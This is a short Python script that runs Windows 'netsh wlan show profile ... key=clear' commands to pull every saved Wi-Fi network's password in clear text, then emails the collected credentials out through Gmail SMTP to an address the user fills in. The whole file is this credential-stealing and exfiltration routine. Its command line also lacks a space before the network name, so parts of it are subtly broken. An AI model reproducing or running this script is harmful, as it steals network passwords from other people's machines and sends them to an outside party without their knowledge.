import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# Windows commands
# command = "netsh wlan show profile UPC723762 key=clear"
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# only capture the latter group
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    cmd = "netsh wlan show profile" + network_name + " key=clear"
    current_result = subprocess.check_output(cmd, shell=True)
    result += current_result

send_mail("<YOUR_EMAIL>@gmail.com", "<YOUR_APP_PW>", result)